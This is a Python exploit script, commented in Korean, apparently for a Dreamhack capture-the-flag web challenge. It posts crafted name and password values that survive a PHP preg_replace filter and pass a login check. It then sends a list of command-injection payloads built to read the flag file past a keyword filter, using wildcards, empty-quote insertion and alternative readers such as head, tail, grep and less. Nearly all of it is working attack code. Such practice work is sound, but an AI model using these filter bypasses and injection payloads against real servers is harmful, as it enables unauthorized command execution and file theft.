#!/usr/bin/env python3
import requests
import re

# 서버 주소 (실제 주소로 변경하세요)
URL = "http://host8.dreamhack.games:8927/step2.php"

def exploit_step1(url):
    """Step 1: 정규표현식 우회하여 Step 2 도달"""
    
    print("="*60)
    print("Step 1: Bypassing preg_replace")
    print("="*60)
    
    # input_name: "nyang" 제거 후 "dnyang0310"이 되도록
    input_name = "dnnyangyang0310"  # nyang 제거 → dnyang0310
    
    # input_pw: 패턴 매칭 후 "d4y0r50ng+1+13"이 되도록
    input_pw = "@99319!+1+13"  # 패턴 매칭 → d4y0r50ng+1+13
    
    print(f"[*] input_name: {input_name}")
    print(f"[*] input_pw: {input_pw}")
    
    # 로컬에서 검증
    name_result = re.sub(r'nyang', '', input_name, flags=re.IGNORECASE)
    pw_result = re.sub(r'\d*\@\d{2,3}(31)+[^0-8\"]\!', 'd4y0r50ng', input_pw)
    print(f"[*] Name after replace: {name_result} (expected: dnyang0310)")
    print(f"[*] PW after replace: {pw_result} (expected: d4y0r50ng+1+13)")
    
    if name_result != "dnyang0310" or pw_result != "d4y0r50ng+1+13":
        print("[-] Local validation failed!")
        return None, None
    
    print("[+] Local validation passed!")
    
    data = {
        "input1": input_name,
        "input2": input_pw
    }
    
    response = requests.post(url, data=data)
    
    if "alphabet in the pw" in response.text:
        print("[-] Alphabet detected in password")
        return None, None
    elif "Almost done" in response.text:
        print("[+] Step 1 passed! Moving to Step 2...")
        return input_name, input_pw
    elif "Wrong nickname or pw" in response.text:
        print("[-] Wrong nickname or pw")
        return None, None
    else:
        print("[-] Unknown response:")
        print(response.text[:500])
        return None, None

def exploit_step2(url, input_name, input_pw):
    """Step 2: 명령어 실행으로 flag 획득"""
    
    print("\n" + "="*60)
    print("Step 2: Command Execution")
    print("="*60)
    
    # "flag" 문자열 우회 방법들
    commands = [
        "cat /var/www/dream/f*",           # 정확한 경로
        "cat /var/www/dream/fla*",         # fla로 시작
        "cat /var/www/dream/fl''ag.txt",   # 빈 문자열 삽입
        "head /var/www/dream/f*",          # head 명령어
        "tail /var/www/dream/f*",          # tail 명령어
        "grep . /var/www/dream/f*",        # grep
        "less /var/www/dream/f*",          # less
        "more /var/www/dream/f*",          # more
        "cat /var/www/dream/*",            # 모든 파일
    ]
    
    for cmd in commands:
        print(f"\n[*] Trying command: {cmd}")
        
        data = {
            "input1": input_name,
            "input2": input_pw,
            "cmd": cmd
        }
        
        response = requests.post(url, data=data)
        
        if "Error!" in response.text:
            print(f"[-] Command blocked: {cmd}")
        elif "--Output--" in response.text:
            print(f"[+] Command executed successfully!")
            
            # Output 추출
            output_start = response.text.find("--Output--") + len("--Output--")
            output_end = response.text.find("</pre>", output_start)
            if output_end != -1:
                output = response.text[output_start:output_end].strip()
                print(f"[+] Output:\n{output}")
                print("-"*60)
                
                # flag 패턴 찾기
                if "DH{" in output or "FLAG{" in output or "flag{" in output or "CTF{" in output:
                    print(f"\n{'='*60}")
                    print(f"[+] FLAG FOUND!")
                    print(f"{'='*60}")
                    print(f"{output}")
                    return True
        else:
            print(f"[-] Unexpected response")
    
    return False

def main():
    # URL 확인
    if "PORT" in URL:
        print("[!] Please update the URL with the actual server address!")
        print("[!] Example: URL = 'http://host8.dreamhack.games:12345/step2.php'")
        print("\nOr you can manually submit:")
        print("  input1: dnnyangyang0310")
        print("  input2: @99319!+1+13")
        print("  cmd: cat f*")
        return
    
    # Step 1 우회
    input_name, input_pw = exploit_step1(URL)
    
    if input_name and input_pw:
        # Step 2 명령어 실행
        exploit_step2(URL, input_name, input_pw)
    else:
        print("\n[-] Step 1 failed. Cannot proceed to Step 2.")

if __name__ == "__main__":
    main()